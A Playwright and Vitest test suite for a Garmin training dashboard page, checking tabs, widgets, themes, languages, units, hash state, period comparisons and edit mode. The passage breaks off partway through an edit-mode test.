import { readFileSync, statSync, writeFileSync } from "node:fs";
import axe from "axe-core";
import type { Browser, Page } from "playwright-core";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { addDays } from "../../src/dates";
import { THEMES } from "../../src/page/theme";
import { digest } from "../../src/digest";
import { en as enTexts } from "../../src/page/i18n/en";
import { preset } from "../../src/page/presets";
import { fitnessFatigueFrom, zonesOf } from "../../src/analytics/metrics";
import { DASHBOARD_VERSION } from "../../src/prompts";
import { pageCode } from "../../src/dashboard-page";
import { data, launch, open, pageFile } from "./page";

let browser: Browser;
beforeAll(async () => {
  browser = await launch();
});
afterAll(async () => {
  await browser?.close();
});

const tabs = (page: Page) =>
  page.$$eval("[role=tab]", (els) =>
    els.map((e) => [e.getAttribute("data-tab"), e.querySelector(".count")?.textContent]),
  );
const tiles = (page: Page) =>
  page.$$eval(".tile", (els) => els.map((e) => (e as HTMLElement).dataset.id));
/** The "Average pace" value of the running board for the given activities. */
async function runningPace(activities: unknown[]): Promise<string | null> {
  const { page } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    {
      hash: "#running",
    },
  );
  return page
    .locator("[data-id=typeKpis] .kpi", {
      has: page.locator(".kpi-label", { hasText: "Average pace" }),
    })
    .locator(".kpi-value")
    .textContent();
}
const hash = (page: Page) => page.evaluate(() => location.hash);
/** A copy of the object without the given fields. */
const without = (o: object, fields: string[]) =>
  Object.fromEntries(Object.entries(o).filter(([k]) => !fields.includes(k)));
/** An activity without Garmin's load: the page estimates it from the HR. */
const noGarminLoad = (a: object) => without(a, ["trainingLoad"]);
/** The ISO time n hours from now. */
const hours = (n: number) => new Date(Date.now() + n * 3_600_000).toISOString();
/** Opens edit mode from the settings menu. */
async function startEdit(page: Page): Promise<void> {
  await page.click(".account summary");
  await page.click(".account-panel >> text=Edit layout");
}

/** The stops of Shift+Tab, from the last control up to the skip link, that sit under the given bar. */
async function stopsUnder(page: Page, bar: string): Promise<{ hidden: string[]; stops: number }> {
  await page.evaluate(() => {
    window.scrollTo(0, document.documentElement.scrollHeight);
    const all = [
      ...document.querySelectorAll<HTMLElement>(
        "a[href], button, input, select, summary, [tabindex='0']",
      ),
    ].filter((e) => e.offsetParent !== null && !e.hasAttribute("disabled"));
    all[all.length - 1].focus();
  });
  const hidden: string[] = [];
  let stops = 0;
  for (; stops < 80; stops++) {
    const hit = await page.evaluate((sel) => {
      const el = document.activeElement as HTMLElement;
      const b = document.querySelector(sel)!.getBoundingClientRect();
      const r = el.getBoundingClientRect();
      const inside = el.closest(sel) !== null;
      const under = !inside && r.width > 0 && r.height > 0 && r.top < b.bottom && r.bottom > b.top;
      return {
        skip: el.classList.contains("skip"),
        label: under
          ? `${el.tagName} ${el.getAttribute("aria-label") ?? el.textContent?.trim().slice(0, 30)}`
          : "",
      };
    }, bar);
    // the skip link is the end of the walk: it sits at the top of the page, above the bar
    if (hit.skip) break;
    if (hit.label) hidden.push(hit.label);
    await page.keyboard.press("Shift+Tab");
  }
  return { hidden, stops };
}

/** The scroll listeners on the window, read through the browser's debugger. */
const scrollListeners = async (page: Page) => {
  const cdp = await page.context().newCDPSession(page);
  const { result } = await cdp.send("Runtime.evaluate", { expression: "window" });
  const { listeners } = await cdp.send("DOMDebugger.getEventListeners", {
    objectId: result.objectId!,
  });
  await cdp.detach();
  return listeners.filter((l) => l.type === "scroll").length;
};

/** The sticky offset the page sets for keyboard focus. */
const stickyOffset = (page: Page) =>
  page.evaluate(() => document.documentElement.style.getPropertyValue("--sticky-h"));

/** The text of the Records tile on the Hike tab of a page with these activities. */
const hikeRecords = async (activities: object[]) => {
  const { page } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    { hash: "#hiking" },
  );
  return page.innerText("[data-id=records]");
};

/** The shown tiles of the board by row: their heights, and the space left at the right of the grid. */
const gridRows = (page: Page) =>
  page.$eval(".grid", (grid) => {
    const box = grid.getBoundingClientRect();
    const rows = new Map<number, { id?: string; height: number; right: number }[]>();
    for (const el of grid.querySelectorAll<HTMLElement>(":scope > .tile")) {
      const r = el.getBoundingClientRect();
      const row = rows.get(Math.round(r.top)) ?? [];
      row.push({ id: el.dataset.id, height: Math.round(r.height), right: r.right });
      rows.set(Math.round(r.top), row);
    }
    return [...rows.values()].map((row) => ({
      ids: row.map((t) => t.id).join("+"),
      heights: new Set(row.map((t) => t.height)).size,
      gap: Math.round(box.right - Math.max(...row.map((t) => t.right))),
    }));
  });

/** A record that the all board met the whole preset, so a test layout of few widgets stays small. */
const MET = { all: preset("all").map((i) => i.widget) };

const ALL_PRESET = [
  "kpis",
  "readiness",
  "calendar",
  "periodComparison",
  "weeklyVolume",
  "intensityMinutes",
  "records",
  "loadSafety",
  "fitnessFatigue",
  "loadVsRecovery",
  "activities",
  "coachNotes",
];

/** Hovers a real data point of every visible chart; returns the ids of the charts without a tooltip. */
async function chartsWithoutTooltip(page: Page): Promise<string[]> {
  const keys = await page.evaluate(() =>
    Object.values(window.Chart!.instances)
      .filter((c) => c.canvas.offsetParent)
      .map((c, i) => {
        c.canvas.dataset.probe = String(i);
        return String(i);
      }),
  );
  const missing: string[] = [];
  for (const key of keys) {
    const pos = await page.evaluate((k) => {
      const c = Object.values(window.Chart!.instances).find((x) => x.canvas.dataset.probe === k)!;
      c.canvas.scrollIntoView({ block: "center" });
      for (let d = 0; d < c.data.datasets.length; d++) {
        const meta = c.getDatasetMeta(d);
        const i = meta.data.findIndex(
          (p) =>
            p && !(p as { skip?: boolean }).skip && Number.isFinite(p.x) && Number.isFinite(p.y),
        );
        if (i >= 0) {
          const r = c.canvas.getBoundingClientRect();
          return { x: r.left + meta.data[i].x, y: r.top + meta.data[i].y };
        }
      }
      return null;
    }, key);
    if (!pos) continue;
    await page.mouse.move(pos.x, pos.y);
    await page.waitForTimeout(80);
    const shown = await page.evaluate(
      (k) =>
        Object.values(window.Chart!.instances)
          .find((x) => x.canvas.dataset.probe === k)!
          .tooltip!.getActiveElements().length > 0,
      key,
    );
    if (!shown)
      missing.push(
        await page.evaluate(
          (k) =>
            Object.values(window.Chart!.instances)
              .find((x) => x.canvas.dataset.probe === k)!
              .canvas.closest(".tile")!
              .getAttribute("data-id")!,
          key,
        ),
      );
  }
  return missing;
}

/** The text of the All, Run, Strength and Bike boards of a page with these units, race names left out. */
async function shownUnits(units?: string): Promise<string> {
  const { page, errors } = await open(browser, pageFile({ data: { ...data, units } }));
  let text = "";
  for (const tab of ["all", "running", "strengthTraining", "cycling"]) {
    await page.click(`[data-tab=${tab}]`);
    text += await page.innerText("#app");
  }
  expect(errors).toEqual([]);
  // race names such as "5 km" and the 15 km long-run threshold stay metric
  return text.replaceAll(/\b(1|5|10|15) km\b/g, "");
}

/** The values of the load ratio tiles: the overview's and the readiness widget's. */
const ratios = (page: Page) =>
  page.$$eval("[data-id=kpis] .kpi, [data-id=readiness] .kpi", (kpis) =>
    kpis
      .filter((k) => (k.querySelector(".kpi-label")?.textContent ?? "").startsWith("Load ratio"))
      .map((k) => k.querySelector(".kpi-value")?.textContent),
  );

/** All sub texts of the tiles of the readiness widget: label → list. */
const readinessSubs = (page: Page) =>
  page.$$eval("[data-id=readiness] .kpi", (kpis): Record<string, string[]> =>
    Object.fromEntries(
      kpis.map((k) => [
        k.querySelector(".kpi-label")?.textContent ?? "",
        [...k.querySelectorAll(".kpi-sub")].map((x) => x.textContent ?? ""),
      ]),
    ),
  );

/** The tiles of a widget: label → [value, sub text or null]. */
const kpiTexts = (page: Page, widget: string) =>
  page.$$eval(`[data-id=${widget}] .kpi`, (kpis) =>
    Object.fromEntries(
      kpis.map((k) => [
        k.querySelector(".kpi-label")?.textContent,
        [
          k.querySelector(".kpi-value")?.textContent,
          k.querySelector(".kpi-sub")?.textContent ?? null,
        ],
      ]),
    ),
  );

/** The page text of the HRV statuses of the fixture. */
const statusText: Record<string, string> = { BALANCED: "Balanced" };

/** The readiness tiles the page must show for the digest's readiness. */
function readinessTiles(r: NonNullable<ReturnType<typeof digest>["readiness"]>) {
  return {
    "HRV status": [r.hrvStatus === null ? "n/a" : (statusText[r.hrvStatus] ?? r.hrvStatus), null],
    "Sleep score": [r.sleepScore === null ? "n/a" : String(r.sleepScore), null],
    "Resting HR": [
      r.rhr === null ? "n/a" : `${r.rhr} bpm`,
      r.rhrAvg7 === null ? null : `7 days before: ${r.rhrAvg7.toFixed(1)} bpm`,
    ],
    "Load ratio 7:28": [r.loadRatio === null ? "n/a" : r.loadRatio.toFixed(2), null],
  };
}

/** Pages for the Garmin word tests. */
const withStatus = (status?: string) => ({
  ...data,
  v: DASHBOARD_VERSION,
  hrv: data.hrv.map((r: Record<string, unknown>, i: number, all: unknown[]) =>
    i === all.length - 1 ? { ...r, status } : r,
  ),
});
const lapTypes = async (languages: string[], intensities?: (string | undefined)[]) => {
  const activities = data.activities.map((a: { laps?: Record<string, unknown>[] }) =>
    a.laps && intensities
      ? {
          ...a,
          laps: a.laps.map((l, i) => ({
            ...l,
            intensity: intensities[i % intensities.length],
          })),
        }
      : a,
  );
  const { page, errors } = await open(
    browser,
    pageFile({ data: { ...data, activities, v: DASHBOARD_VERSION }, settings: { languages } }),
  );
  const buttons = page.locator("[data-id=activities] button[aria-expanded]:visible");
  for (let i = 0, n = await buttons.count(); i < n; i++) await buttons.nth(i).click();
  const cells = await page.$$eval(".laps-row tbody tr", (rows) =>
    rows.map((r) => r.lastElementChild!.textContent),
  );
  expect(errors).toEqual([]);
  return cells;
};

const hrvTile = async (status: string | undefined, languages: string[], label: string) => {
  const { page, errors } = await open(
    browser,
    pageFile({ data: withStatus(status), settings: { languages } }),
  );
  const tile = (await kpiTexts(page, "readiness"))[label];
  expect(errors).toEqual([]);
  return { tile, verdict: await page.textContent(".verdict") };
};

/** A number as the page's fmt.num shows it in English: no decimals. */
const whole = new Intl.NumberFormat("en", { maximumFractionDigits: 0 });

/** The fitness, fatigue and form tiles for the last day of a fitnessFatigueFrom result. */
const fitnessTiles = (ff: { fitness: number[]; fatigue: number[]; form: number[] }) => ({
  "Fitness · 42 days": [whole.format(ff.fitness.at(-1)!), null],
  "Fatigue · 7 days": [whole.format(ff.fatigue.at(-1)!), null],
  Form: [whole.format(ff.form.at(-1)!), null],
});

/** The dataset labels of the bar charts in the tiles of `widget`. */
const barLabels = (page: Page, widget: string) =>
  page.evaluate(
    (w) =>
      Object.values(window.Chart!.instances)
        .filter(
          (c) =>
            c.canvas.closest(`[data-widget=${w}]`) &&
            (c.config as { type?: string }).type === "bar",
        )
        .flatMap((c) => c.data.datasets.map((d) => String(d.label))),
    widget,
  );

/** A lap row of `planVerdicts` with the given verdict. */
const planRow = (verdict: unknown) => ({ step: 1, type: "cadence", verdict, why: "" });

/** The values and the gap setting of the dataset `label` of the chart in the tile of `widget`. */
const chartDataset = (page: Page, widget: string, label: string) =>
  page.evaluate(
    ([w, l]) => {
      // a widget can draw more than one chart: take the dataset of the label from any of them
      const d = Object.values(window.Chart!.instances)
        .filter((c) => c.canvas.closest(`[data-widget=${w}]`))
        .flatMap((c) => c.data.datasets)
        .find((x) => x.label === l)!;
      return { data: d.data, spanGaps: (d as { spanGaps?: unknown }).spanGaps };
    },
    [widget, label],
  );

/** The value of the "Ascent" tile of the cycling board for the given activities. */
async function cyclingAscent(activities: unknown[]): Promise<{ text: string | null; page: Page }> {
  const { page, errors } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    { hash: "#cycling" },
  );
  expect(errors).toEqual([]);
  const text = await page
    .locator("[data-id=typeKpis] .kpi", { has: page.locator(".kpi-label", { hasText: "Ascent" }) })
    .locator(".kpi-value")
    .textContent();
  return { text, page };
}

/** A ride on a trainer, with a distance or without. */
const indoorRide = (n: number, start: string, km?: number) => ({
  id: 800 + n,
  name: "Ride",
  type: "indoor_cycling",
  sport: "cycling",
  duration: "45:00",
  start: `${start} 09:00:00`,
  ...(km === undefined ? {} : { km }),
});
/** The value and the number of lines under it of the "Distance" tile of the cycling board. */
async function distanceTile(activities: unknown[]) {
  const { page, errors } = await open(
    browser,
    pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities } }),
    { hash: "#cycling" },
  );
  expect(errors).toEqual([]);
  const tile = page.locator("[data-id=typeKpis] .kpi", {
    has: page.locator(".kpi-label", { hasText: "Distance" }),
  });
  return {
    value: await tile.locator(".kpi-value").textContent(),
    sub: await tile.locator(".kpi-sub").count(),
  };
}

/** A synthetic running row; a missing name gives a row without the field. */
const row = (id: number, name: string | undefined, start: string) => ({
  id,
  ...(name ? { name } : {}),
  type: "running",
  sport: "running",
  start,
  km: 5,
  duration: "30:00",
});

type Block = "start" | "center" | "end";

/** The dates whose calendar tip leaves the viewport, or whose tile body grows a scroll. */
async function badTipDates(page: Page, block: Block, only?: string): Promise<string[]> {
  return page.$$eval(
    "[data-id=calendar] .cal-cell[data-date]",
    (cells, args) => {
      const bad: string[] = [];
      const tip = document.querySelector(".cal-tip") as HTMLElement;
      const body = document.querySelector("[data-id=calendar] .tile-body") as HTMLElement;
      const view = document.documentElement;
      for (const cell of cells) {
        const date = cell.getAttribute("data-date") ?? "";
        if (args.only && date !== args.only) continue;
        cell.scrollIntoView({ block: args.block });
        cell.dispatchEvent(new PointerEvent("pointerenter"));
        const r = tip.getBoundingClientRect();
        const inside =
          !tip.hidden &&
          r.left >= 0 &&
          r.top >= 0 &&
          r.right <= view.clientWidth &&
          r.bottom <= view.clientHeight;
        if (!inside || body.scrollHeight > body.clientHeight) bad.push(date);
        cell.dispatchEvent(new PointerEvent("pointerleave"));
      }
      return bad;
    },
    { block, only },
  );
}

const frames = (page: Page) =>
  page.evaluate(
    () => new Promise((done) => requestAnimationFrame(() => requestAnimationFrame(done))),
  );

/** The tip's top minus the cell's bottom, and the cell's top minus the tip's bottom. */
const tipGaps = (page: Page, selector: string) =>
  page.evaluate((s) => {
    const cell = document.querySelector(s)!.getBoundingClientRect();
    const tip = document.querySelector(".cal-tip")!.getBoundingClientRect();
    return { below: tip.top - cell.bottom, above: cell.top - tip.bottom };
  }, selector);

const followsCell = (g: { below: number; above: number }) =>
  Math.abs(g.below - 6) <= 1 || Math.abs(g.above - 6) <= 1;

describe("the page", () => {
  it("keeps the template small", () => {
    // minified, with only the Chart.js parts the page uses: Chart.js is most of it, and the page
    // code grows by about 1 KB a feature
    expect(statSync("dist/dashboard.html").size).toBeLessThan(400 * 1024);
  });

  it("shows the preset widgets of the All board and no errors", async () => {
    const { page, errors } = await open(browser, pageFile());
    expect(await page.textContent("h1")).toBe("Training + Recovery");
    expect(await page.textContent("h2.headline")).toBe(
      "Training load, recovery and progress from Garmin Connect",
    );
    expect(await tiles(page)).toEqual(ALL_PRESET);
    // the server escaped the note: it shows as text
    expect(await page.textContent(".notes li")).toBe("Load <b>1.2");
    expect(errors).toEqual([]);
  });

  it("has a tab for each type in the data, with the sessions of the window", async () => {
    const { page } = await open(browser, pageFile());
    expect(await tabs(page)).toEqual([
      ["all", "75"],
      ["recovery", undefined],
      ["running", "36"],
      ["strengthTraining", "24"],
      ["walking", "9"],
      ["cycling", "3"],
      ["racket", "3"],
    ]);
  });

  it("has no tab for a sport without activities, and opens All for an old link to its tab", async () => {
    const runs = data.activities.filter((a: { sport?: string }) => a.sport === "running");
    const file = pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities: runs } });
    const { page, errors } = await open(browser, file, { hash: "#cycling" });
    expect(await tabs(page)).toEqual([
      ["all", String(runs.length)],
      ["recovery", undefined],
      ["running", String(runs.length)],
    ]);
    expect(await page.getAttribute("[data-tab=all]", "aria-selected")).toBe("true");
    expect(errors).toEqual([]);
  });

  it("shows the units of the Garmin profile, and metric without them", async () => {
    const us = await shownUnits("statute_us");
    expect(us).toMatch(/\d mi\b/);
    expect(us).toMatch(/\d:\d\d\/mi\b/);
    expect(us).toMatch(/\d lb\b/);
    expect(us).not.toMatch(/\d km\b|\/km\b|km\/h|\d kg\b/);
    const metric = await shownUnits();
    expect(metric).toMatch(/\d km\b/);
    expect(metric).toMatch(/\d kg\b/);
    expect(metric).not.toMatch(/\d mi\b|\/mi\b|\d lb\b/);
  });

  it("keeps the tab and the window in the URL hash", async () => {
    const file = pageFile();
    const { page } = await open(browser, file);
    await page.click("[data-tab=running]");
    await page.focus("[data-tab=running]");
    await page.keyboard.press("ArrowRight");
    expect(await page.getAttribute("[data-tab=strengthTraining]", "aria-selected")).toBe("true");
    await page.click(".window-bar .chip >> text=Last 4");
    expect(await hash(page)).toBe("#strengthTraining@2026-10-05_2026-10-26");

    const again = await open(browser, file, { hash: "#strengthTraining@2026-10-05_2026-10-26" });
    expect(await again.page.getAttribute("[data-tab=strengthTraining]", "aria-selected")).toBe(
      "true",
    );
    expect(await again.page.inputValue("#from")).toBe("2026-10-05");
  });

  it("name filter: compares the chosen names with the previous rows of the same names", async () => {
    const activities = [
      row(9301, "Quarry Loop", "2026-10-20 07:00:00"),
      row(9302, "Ridge Walk", "2026-10-21 07:00:00"),
    ];
    const named = [
      row(9311, "Quarry Loop", "2026-07-20 07:00:00"),
      row(9312, "Quarry Loop", "2026-07-21 07:00:00"),
      row(9313, "Quarry Loop", "2026-07-22 07:00:00"),
      row(9314, "Ridge Walk", "2026-07-23 07:00:00"),
    ];
    const hashOf = "#all@2026-08-03_2026-10-26~Quarry%20Loop";
    const sessions = async (previousActivities: unknown[]) => {
      const { page, errors } = await open(
        browser,
        pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities, previousActivities } }),
        { hash: hashOf },
      );
      const cells = await page.$$eval(
        "[data-widget=periodComparison] tbody tr:first-child td",
        (c) => c.map((x) => x.textContent?.trim()),
      );
      expect(errors).toEqual([]);
      return cells[1];
    };
    // 1 chosen session now against 3 chosen sessions before: the 4th row has another name
    expect(await sessions(named)).toBe("1 ▼ 67%");
    // the control: rows without a name leave nothing to compare with
    const nameless = named.map((r) => row(r.id, undefined, r.start));
    expect(await sessions(nameless)).toBe("1");
  });

  it("compares the window with as many days right before it, as the digest does", async () => {
    // 2026-08-03 to 2026-10-26 is 85 days, so the previous period is 2026-05-10 to 2026-08-02
    const activities = [row(9401, "Quarry Loop", "2026-10-20 07:00:00")];
    const previousActivities = [
      row(9411, "Quarry Loop", "2026-05-09 07:00:00"),
      row(9412, "Quarry Loop", "2026-05-10 07:00:00"),
      row(9413, "Quarry Loop", "2026-05-10 18:00:00"),
      row(9414, "Quarry Loop", "2026-08-02 07:00:00"),
    ];
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities, previousActivities } }),
      { hash: "#all@2026-08-03_2026-10-26" },
    );
    const sel = "[data-widget=periodComparison]";
    expect(await page.textContent(`${sel} p`)).toContain("May 10 to Aug 2");
    // 1 session now against 3 before: the row of 9 May is outside the 85 days
    expect(await page.textContent(`${sel} tbody tr:first-child td:nth-child(2)`)).toContain(
      "1 ▼ 67%",
    );
    expect(errors).toEqual([]);
  });

  it("ends the compared window on the Sunday of its last week, not on its Monday", async () => {
    // 2026-08-03 to Sunday 2026-10-25 is 84 days, so the previous period is 2026-05-11 to 2026-08-02
    const activities = [row(9501, "Quarry Loop", "2026-10-20 07:00:00")];
    const previousActivities = [
      row(9511, "Quarry Loop", "2026-05-10 07:00:00"),
      row(9512, "Quarry Loop", "2026-05-11 07:00:00"),
      row(9513, "Quarry Loop", "2026-05-16 07:00:00"),
      row(9514, "Quarry Loop", "2026-08-02 07:00:00"),
    ];
    const { page, errors } = await open(
      browser,
      pageFile({ data: { ...data, v: DASHBOARD_VERSION, activities, previousActivities } }),
      { hash: "#all@2026-08-03_2026-10-19" },
    );
    const sel = "[data-widget=periodComparison]";
    expect(await page.textContent(`${sel} p`)).toContain("May 11 to Aug 2");
    // 1 session now against 3 before; ending on the Monday would give 78 days from 17 May, so 1
    expect(await page.textContent(`${sel} tbody tr:first-child td:nth-child(2)`)).toContain(
      "1 ▼ 67%",
    );
    expect(errors).toEqual([]);
  });

  it("shows only the chosen activity names, also after a reload", async () => {
    const file = pageFile();
    const { page, errors } = await open(browser, file);
    await page.click(".names-open");
    const top = () => page.$eval(".dialog", (d) => d.getBoundingClientRect().top);
    const before = await top();
    // the search hides the other names; the list keeps the boxes that it hides
    await page.fill(".dialog .catalogue-search", "run");
    expect(await top()).toBe(before);
    expect(await page.locator(".dialog li[data-find]:visible").allTextContents()).toEqual([
      "Easy Run12",
      "Long Run10",
      "Tempo Run6",
    ]);
    await page.check(".dialog label >> text=Long Run");
    await page.fill(".dialog .catalogue-search", "strength a");
    await page.check(".dialog label >> text=Strength A");
    await page.fill(".dialog .catalogue-search", "zzz");
    expect(await page.isVisible(".dialog >> text=No name matches.")).toBe(true);
    await page.click(".dialog >> text=Done");
    expect(await page.textContent(".names-open")).toContain("Activity names: 2 chosen");
    // in the order of the list, the most frequent first
    expect(await hash(page)).toBe("#all@2026-08-03_2026-10-26~Strength%20A,Long%20Run");
    const chosen = [
      ["all", "22"],
      ["recovery", undefined],
      ["running", "10"],
      ["strengthTraining", "12"],
      ["walking", "0"],
      ["cycling", "0"],
      ["racket", "0"],
    ];
    expect(await tabs(page)).toEqual(chosen);
    // the running board lists only the running names, and keeps the chosen ones
    await page.click("[data-tab=running]");
    await page.click(".names-open");
    expect(await page.locator(".dialog label").allTextContents()).toEqual([
      "Easy Run",
      "Long Run",
      "Tempo Run",
      "Track Intervals",
      "City 10K",
      "Riverside Half Marathon",
      "Strength A",
    ]);
    await page.keyboard.press("Escape");

    const again = await open(browser, file, { hash: "#all~Long%20Run,Strength%20A" });
    expect(await tabs(again.page)).toEqual(chosen);
    await again.page.click("[aria-label='Remove Long Run']");
    expect((await tabs(again.page))[0]).toEqual(["all", "12"]);
    await again.page.click(".names-open");
    await again.page.click(".dialog >> text=Show all");
    expect((await tabs(again.page))[0]).toEqual(["all", "75"]);
    expect(await hash(again.page)).toBe("#all@2026-08-03_2026-10-26");
    expect([...errors, ...again.errors]).toEqual([]);
  });

  it("moves focus to the board with the skip link and keeps the view", async () => {
    const { page } = await open(browser, pageFile(), {
      hash: "#strengthTraining@2026-10-05_2026-10-26",
    });
    await page.keyboard.press("Tab"); // the skip link is the first focusable element
    await page.keyboard.press("Enter");
    expect(await hash(page)).toBe("#strengthTraining@2026-10-05_2026-10-26");
    expect(await page.evaluate(() => document.activeElement?.id)).toBe("board");
  });

  it("opens a link with a broken item", async () => {
    const { page, errors } = await open(browser, pageFile(), { hash: "#strengthTraining/%E0" });
    expect(await page.getAttribute("[data-tab=strengthTraining]", "aria-selected")).toBe("true");
    expect(errors).toEqual([]);
  });

  it("switches between the 13 themes and keeps the choice", async () => {
    const file = pageFile();
    const { page, errors } = await open(browser, file);
    const themes = await page.$$eval("#theme option", (o) =>
      o.map((x) => (x as HTMLOptionElement).value),
    );
    expect(themes).toHaveLength(13);
    expect(await page.inputValue("#theme")).toBe("midnight");
    // the menu stays open while the page renders again for each theme
    await page.click(".account summary");
    for (const theme of themes) await page.selectOption("#theme", theme);
    await page.selectOption("#theme", "paper");
    await page.keyboard.press("Escape");
    expect(await page.$(".account[open]")).toBeNull();
    await page.click(".account summary");
    await page.click("h1");
    expect(await page.$(".account[open]")).toBeNull();
    await page.reload();
    expect(await page.evaluate(() => document.documentElement.dataset.theme)).toBe("paper");
    expect(errors).toEqual([]);
  });

  it("follows the browser language, and the language menu", async () => {
    const { page } = await open(browser, pageFile({ settings: { languages: ["en", "it"] } }), {
      locale: "it-IT",
    });
    expect(await page.textContent("h1")).toBe("Allenamento + Recupero");
    expect(await page.textContent("[data-tab=running]")).toContain("Corsa");
    await page.click(".account summary");
    await page.selectOption("#lang", "en");
    expect(await page.textContent("h1")).toBe("Training + Recovery");
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("en");
  });

  it("opens in the language of the Garmin profile, until the reader picks one", async () => {
    const file = pageFile({
      data: { ...data, locale: "pt-BR" },
      settings: { languages: ["en", "pt"] },
    });
    const { page } = await open(browser, file, { locale: "en-US" });
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("pt");
    await page.click(".account summary");
    expect(await page.inputValue("#lang")).toBe("pt");
    await page.selectOption("#lang", "auto");
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("en");
  });

  it("says when the page has no texts in the language of the Garmin profile", async () => {
    const { page, errors } = await open(browser, pageFile({ data: { ...data, locale: "ru" } }), {
      locale: "ru-RU",
    });
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("en");
    await page.click(".account summary");
    expect(await page.textContent(".menu-note")).toBe(
      "Русский is not in this page yet. Ask your assistant to add it.",
    );
    expect(errors).toEqual([]);
    const pt = await open(
      browser,
      pageFile({ data: { ...data, locale: "pt-BR" }, settings: { languages: ["en", "pt"] } }),
    );
    await pt.page.click(".account summary");
    expect(await pt.page.locator(".menu-note").count()).toBe(0);
  });

  it("shows the title, the sports, the data and the menus of its settings", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        settings: {
          title: "For my coach",
          headline: "Running block, autumn",
          sports: ["running", "cycling"],
          exclude: ["recovery", "notes"],
          languages: ["en"],
          themes: ["paper"],
          theme: "paper",
        },
      }),
      { locale: "it-IT" },
    );
    expect(await page.textContent("h1")).toBe("For my coach");
    expect(await page.title()).toBe("For my coach");
    expect(await page.textContent("h2.headline")).toBe("Running block, autumn");
    expect((await tabs(page)).map(([tab]) => tab)).toEqual(["all", "running", "cycling"]);
    expect(await tiles(page)).not.toContain("hrv");
    expect(await tiles(page)).not.toContain("coachNotes");
    // English only, one theme: no menus to choose them
    expect(await page.evaluate(() => document.documentElement.lang)).toBe("en");
    expect(await page.evaluate(() => document.documentElement.dataset.theme)).toBe("paper");
    expect(await page.$("#lang")).toBeNull();
    expect(await page.$("#theme")).toBeNull();
    expect(errors).toEqual([]);
  });

  it("shows only Italian on a page that leaves English out, also for an English browser", async () => {
    const { page, errors } = await open(browser, pageFile({ settings: { languages: ["it"] } }), {
      locale: "en-US",
    });
    expect(await page.textContent("h1")).toBe("Allenamento + Recupero");
    expect(await page.textContent("h2.headline")).toBe(
      "Carico di allenamento, recupero e progressi da Garmin Connect",
    );
    expect(await page.$("#lang")).toBeNull();
    expect(errors).toEqual([]);
  });

  it("tells in the footer when the data was written, and the days that Garmin did not give", async () => {
    const { page, errors } = await open(
      browser,
      pageFile({
        data: {
          ...data,
          v: DASHBOARD_VERSION,
          server: "0.10.0",
          notes: [],
          updated: "2026-10-27T05:30:00.000Z",
        },
      }),
      { timezoneId: "Europe/Rome" },
    );
    // the date and time of the write, in the viewer's time zone
    expect(await page.textContent("footer .source")).toBe(
      "Data from Garmin Connect, updated Oct 27, 2026, 6:30 AM",
    );
    expect(await page.$("footer .gap")).toBeNull();
    expect(await page.getAttribute("footer a.brand", "href")).toBe(
      "https://garmin-personal-mcp.indaco.dev",
    );
    expect(await page.getAttribute("footer a >> text=MIT License", "href")).toContain("LICENSE");
    // the version of the server that wrote the page, with its release notes
    expect(await page.getAttribute("footer a >> text=v0.10.0", "href")).toBe(
      "https://garmin-personal-mcp.indaco.dev/whats-new.html#v0-10-0",
    );
    // the website has that place
    expect(readFileSync("dist-site/whats-new.html", "utf8")).toContain('<article id="v0-10-0">');

    const failed = await open(
      browser,
      pageFile({
        data: {
          ...data,
          v: DASHBOARD_VERSION,
          notes: [],
          sync: { ...data.sync, failedDays: 2 },
        },
      }),
    );
    // data without the server version and the write time (an older page) shows none, and the date
    expect(await failed.page.textContent("footer .made")).toBe("garmin-personal-mcp·MIT License");
    expect(await failed.page.textContent("footer .source")).toMatch(/updated Oct 26, 2026Days not/);
    expect(await failed.page.textContent("footer .gap")).toBe(
      "Days not read from Garmin: 2 (their values show n/a)",
    );
    expect([...errors, ...failed.errors]).toEqual([]);
  });

  it("shows a message without data", async () => {
    const { page, errors } = await open(browser, pageFile({ data: null }));
    expect(await page.textContent("#app")).toContain("no data yet");
    expect(errors).toEqual([]);
  });

  it("does not scroll sideways at phone width", async () => {
    const { page } = await open(browser, pageFile(), { viewport: { width: 390, height: 844 } });
    expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(
      true,
    );
  });
});

/** The layout that this browser saved, or null. */
const saved = (page: Page) =>
  page.evaluate(() => localStorage.getItem(`garmin-layout:${location.pathname}`));

const of = (id: string, span: number, extra = {}) => ({ id, widget: id, span, ...extra });
const tallBox = (id: string, height: number) =>
  custom(id, `el.innerHTML = '<div style="height:${height}px"></div>';`);

/** Each tile as `id:span`, in board order. */
const spans = (page: Page) =>
  page.$$eval(".tile", (els) =>
    els
      .map((e) => `${(e as HTMLElement).dataset.id}:${e.className.match(/span-(\d)/)?.[1]}`)
      .join(" "),
  );
const onAll = (all: unknown[]) => ({ rev: "r1", base: "preset", seen: MET, boards: { all } });

describe("edit mode", () => {
  const one = {
    rev: "r0",
    base: "preset",
    seen: MET,
    boards: { all: [{ id: "coachNotes", widget: "coachNotes", span: 3 }] },
  };
  const two = {
    rev: "r1",
    base: "preset",
    seen: MET,
    boards: {
      all: [
        { id: "coachNotes", widget: "coachNotes", span: 3 },
        { id: "x", widget: "notYet", span: 1 },
      ],
    },
  };

  it("hides a widget, and shows it again from the Add widget dialog", async () => {
    const { page } = await open(browser, pageFile({ layout: one }));
    await startEdit(page);
    await page.click("[aria-label='Hide Coach notes']");
    // a hidden widget leaves the grid; the dialog lists it
    expect(await tiles(page)).toEqual([]);
    expect(await page.textContent(".edit-bar")).toContain("Add widget · 1 hidden");
    await page.click(".edit-bar >> text=Add widget");
    await page.click("dialog >> text=Show Coach notes");
    expect(await tiles(page)).toEqual(["coachNotes"]);
    expect(await page.textContent("#announce")).toBe("Coach notes shown");
    await page.click("[aria-label='Hide Coach notes']");
